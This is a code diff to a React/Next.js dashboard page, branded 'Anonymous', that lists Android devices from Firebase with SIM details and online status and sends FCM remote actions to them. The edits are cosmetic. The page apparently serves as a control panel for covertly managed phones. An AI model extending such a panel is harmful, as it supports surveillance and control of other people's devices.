@@ -19,8 +19,6 @@ import {
 } from "firebase/database";
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 
-
-
 const INITIAL_PAGE_SIZE = 20;
 const NEXT_PAGE_SIZE = 10;
 const CHECKONLINE_SYNC_INTERVAL_MS = 5 * 60 * 1000;
@@ -498,6 +496,11 @@ export default function DevicesPage() {
     return result;
   }, [devices, searchQuery, activeOnly]);
 
+  // Reverse the filtered devices so newest appears first (top)
+  const reversedDevices = useMemo(() => {
+    return [...filteredDevices].reverse();
+  }, [filteredDevices]);
+
   const sendFCMAction = async (device: Device, endpoint: string, loadingKey?: string) => {
     const key = loadingKey || endpoint;
     setActionLoading(key);
@@ -572,25 +575,26 @@ export default function DevicesPage() {
   return (
     <div className="min-h-screen bg-white">
       <header className="w-full bg-black">
-        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
-          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
+        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4 gap-4">
+          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d] shrink-0">
             Anonymous
           </Link>
-          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
+          {/* Nav: horizontal scroll on small screens, no wrapping */}
+          <nav className="flex items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base overflow-x-auto whitespace-nowrap scrollbar-hide">
             <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
               Home
             </Link>
             <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
               Setting
             </Link>
-           <a
-  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
-  target="_blank"
-  rel="noopener noreferrer"
-  className="text-white/85 transition-colors hover:text-white"
->
-  Support
-</a>
+            <a
+              href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-white/85 transition-colors hover:text-white"
+            >
+              Support
+            </a>
             <button
               onClick={async () => {
                 await fetch("/api/logout", { method: "POST" });
@@ -660,10 +664,11 @@ export default function DevicesPage() {
             </div>
           </div>
 
+          {/* Card grid remains side-by-side: grid-cols-2 */}
           <div className="mt-8 grid grid-cols-2 gap-5">
-            {filteredDevices.map((device, index) => {
-              const displayIndex = filteredDevices.length - index;
-
+            {reversedDevices.map((device, index) => {
+              const serialNumber = filteredDevices.length - index;
+              const onlineColorClass = isDeviceActive(device) ? "text-green-500" : "text-red-500";
               return (
                 <div
                   key={device.deviceId}
@@ -672,7 +677,7 @@ export default function DevicesPage() {
                   className="flex flex-col border border-gray-300 bg-white rounded-lg p-4"
                 >
                   <h2 className="mb-3 text-center text-sm font-bold leading-tight text-blue-700">
-                    {displayIndex}. {device.brand} {device.model} ({device.androidVersion})
+                    {serialNumber}. {device.brand} {device.model} ({device.androidVersion})
                   </h2>
 
                   <div className="flex-1 overflow-hidden border border-gray-300 bg-gray-50 text-center text-xs font-semibold text-gray-700 rounded">
@@ -681,7 +686,7 @@ export default function DevicesPage() {
                     <div className="px-3 py-2 border-b border-gray-300">Android: {device.androidVersion}</div>
                     <div className="px-3 py-2 border-b border-gray-300">{getPrimarySimLine(device)}</div>
                     <div className="px-3 py-2">
-                      online: <span className="text-red-500">{formatLastChecked(device.lastChecked)}</span>
+                      online: <span className={onlineColorClass}>{formatLastChecked(device.lastChecked)}</span>
                     </div>
                   </div>
 
